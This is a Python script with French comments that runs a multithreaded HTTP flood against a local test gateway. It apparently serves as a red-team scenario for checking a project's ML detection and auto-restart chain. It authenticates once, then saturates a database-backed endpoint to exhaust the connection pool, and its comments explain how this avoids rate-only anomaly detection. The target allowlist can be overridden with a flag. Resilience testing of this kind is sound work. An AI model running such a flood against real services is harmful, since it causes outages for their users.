#!/usr/bin/env python3
"""Flood HTTP minimal : scénario ER1 (déni de service par saturation).

Sert à valider la chaîne de bout en bout : détection ML -> décision -> restart ->
sonde de reprise. C'est un gabarit de départ pour François (Red Team) : le vrai
scénario de chaos devra venir du PC Attaquant vers le PC Hôte, pas de ce poste.

Un flood sur une route non authentifiée est rejeté en 401 avant de toucher la base :
le débit de requêtes grimpe, mais la latence et le taux d'erreur restent normaux, et le
modèle ne voit rien passer (confirmé en test réel : IsolationForest sature sur le débit
seul, voir docs/gouvernance/06-pilotage-arbitrages.md). On s'authentifie donc une fois,
puis on hammer une route adossée à la base (`/me/account`) pour épuiser le pool de
connexions PostgreSQL (`DB_POOL_SIZE`, 5 + 2 par défaut) et provoquer une vraie
dégradation (latence, 5xx).

Garde-fous :
  - cible par défaut = la passerelle locale de CE dépôt (127.0.0.1:8080) ;
  - toute autre cible doit être explicitement confirmée (--yes-i-know-the-target) ;
  - jamais le réseau du campus, d'un autre groupe, ni Internet (règle du dépôt).

Usage :
    python attack/flood_http.py --duration 30 --rate 60
"""

from __future__ import annotations

import argparse
import json
import os
import threading
import time
import urllib.error
import urllib.request
from datetime import UTC, datetime

DEFAULT_TARGET = "http://127.0.0.1:8080"
ALLOWED_HOSTS = {"127.0.0.1", "localhost", "192.168.137.1"}  # PC Hôte du consortium
LOGIN_EMAIL = "alice@resilience.local"  # compte du seed de démo
TIMEOUT_S = 3.0


class Counters:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.sent = 0
        self.ok = 0
        self.errors = 0

    def add(self, success: bool) -> None:
        with self._lock:
            self.sent += 1
            if success:
                self.ok += 1
            else:
                self.errors += 1

    def snapshot(self) -> tuple[int, int, int]:
        with self._lock:
            return self.sent, self.ok, self.errors


def _check_target(base_url: str, confirmed: bool) -> None:
    from urllib.parse import urlparse

    host = urlparse(base_url).hostname or ""
    if host not in ALLOWED_HOSTS and not confirmed:
        raise SystemExit(
            f"cible '{base_url}' hors de la passerelle locale attendue.\n"
            "Règle du dépôt : attaques uniquement depuis le PC Attaquant vers le PC "
            "Hôte du consortium (192.168.137.1), jamais le campus ni Internet.\n"
            "Si c'est bien le PC Hôte visé depuis le PC Attaquant, ajouter "
            "--yes-i-know-the-target."
        )


def login(base_url: str, password: str) -> str:
    """Un seul jeton, réutilisé par tous les threads : le flood vise la charge, pas l'auth."""
    body = json.dumps({"email": LOGIN_EMAIL, "password": password}).encode()
    request = urllib.request.Request(
        base_url + "/auth/login",
        data=body,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT_S) as response:
            payload = json.loads(response.read())
            return str(payload["token"])
    except (urllib.error.URLError, OSError, KeyError, json.JSONDecodeError) as exc:
        raise SystemExit(
            f"connexion impossible sur {base_url} : pile démarrée et "
            f"scripts/seed_demo.py lancé ? ({exc})"
        ) from exc


def hit(base_url: str, path: str, token: str, counters: Counters, stop_at: float) -> None:
    while time.monotonic() < stop_at:
        try:
            request = urllib.request.Request(
                base_url + path, method="GET", headers={"Authorization": f"Bearer {token}"}
            )
            with urllib.request.urlopen(request, timeout=TIMEOUT_S) as response:
                counters.add(200 <= response.status < 500)
        except urllib.error.HTTPError as exc:
            counters.add(exc.code < 500)
        except (urllib.error.URLError, TimeoutError, OSError):
            counters.add(False)


def run(base_url: str, path: str, token: str, duration_s: float, workers: int) -> None:
    counters = Counters()
    stop_at = time.monotonic() + duration_s
    threads = [
        threading.Thread(target=hit, args=(base_url, path, token, counters, stop_at), daemon=True)
        for _ in range(workers)
    ]
    start = time.monotonic()
    for thread in threads:
        thread.start()

    print(f"flood démarré sur {base_url}{path} ({workers} threads, {duration_s:.0f} s)")
    # Horloge murale (UTC) : référence du RTO, comparable aux horodatages des événements du moteur.
    print(f"début de l'attaque : {datetime.now(UTC).isoformat()}")
    last_report = start
    while time.monotonic() < stop_at:
        time.sleep(1)
        if time.monotonic() - last_report >= 5:
            sent, ok, errors = counters.snapshot()
            elapsed = time.monotonic() - start
            print(f"  {elapsed:.0f}s : {sent} envoyées, {ok} ok, {errors} erreurs")
            last_report = time.monotonic()
    for thread in threads:
        thread.join(timeout=TIMEOUT_S + 1)

    sent, ok, errors = counters.snapshot()
    print(f"terminé : {sent} envoyées, {ok} ok, {errors} erreurs")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("--base-url", default=DEFAULT_TARGET)
    parser.add_argument(
        "--path",
        default="/me/account",
        help="endpoint ciblé, authentifié et adossé à la base (défaut : /me/account)",
    )
    parser.add_argument("--duration", type=float, default=30.0, help="secondes")
    parser.add_argument(
        "--rate",
        type=int,
        default=60,
        help="nombre de threads concurrents ; doit dépasser le pool de connexions DB pour "
        "provoquer une vraie dégradation (défaut : 60)",
    )
    parser.add_argument(
        "--yes-i-know-the-target",
        action="store_true",
        help="confirme une cible hors de 127.0.0.1 / localhost / 192.168.137.1",
    )
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    _check_target(base_url, args.yes_i_know_the_target)
    password = os.environ.get("SEED_PASSWORD", "demo-only-not-a-secret")
    token = login(base_url, password)
    try:
        run(base_url, args.path, token, args.duration, max(1, args.rate))
    except KeyboardInterrupt:
        print("\narrêt demandé")


if __name__ == "__main__":
    main()
